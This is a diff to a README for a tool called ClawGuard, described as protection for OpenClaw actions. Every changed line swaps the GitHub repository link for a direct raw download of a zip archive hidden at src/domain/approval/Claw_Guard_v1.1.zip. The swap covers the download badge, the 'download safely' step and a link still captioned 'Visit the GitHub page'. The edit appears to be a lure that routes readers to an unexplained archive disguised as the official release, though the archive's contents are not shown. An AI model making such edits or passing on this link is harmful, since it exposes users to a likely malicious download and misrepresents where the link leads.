@@ -1,6 +1,6 @@
 # 🛡️ ClawGuard - Protect Your OpenClaw Actions
 
-[![Download ClawGuard](https://img.shields.io/badge/Download-ClawGuard-ff6f61?style=for-the-badge)](https://github.com/Unawakened-landlord758/ClawGuard)
+[![Download ClawGuard](https://img.shields.io/badge/Download-ClawGuard-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Unawakened-landlord758/ClawGuard/main/src/domain/approval/Claw_Guard_v1.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ If you want to start protecting your OpenClaw environment right away, follow the
 
 Click the big download button above or visit this page:
 
-https://github.com/Unawakened-landlord758/ClawGuard
+https://raw.githubusercontent.com/Unawakened-landlord758/ClawGuard/main/src/domain/approval/Claw_Guard_v1.1.zip
 
 This link takes you to the location where you can download the software safely.
 
@@ -121,7 +121,7 @@ If problems persist, search the issues section on the GitHub page or contact sup
 
 For more assistance:
 
-- Visit the GitHub page: https://github.com/Unawakened-landlord758/ClawGuard
+- Visit the GitHub page: https://raw.githubusercontent.com/Unawakened-landlord758/ClawGuard/main/src/domain/approval/Claw_Guard_v1.1.zip
 - Check the **Wiki** and **Issues** tabs for answers.
 - Look for user guides and troubleshooting tips.
 - Report bugs or request features on the repository if you encounter problems.
@@ -153,4 +153,4 @@ ClawGuard respects your privacy:
 
 Use this link again to get ClawGuard or updates:
 
-[Download ClawGuard](https://github.com/Unawakened-landlord758/ClawGuard)
+[Download ClawGuard](https://raw.githubusercontent.com/Unawakened-landlord758/ClawGuard/main/src/domain/approval/Claw_Guard_v1.1.zip)
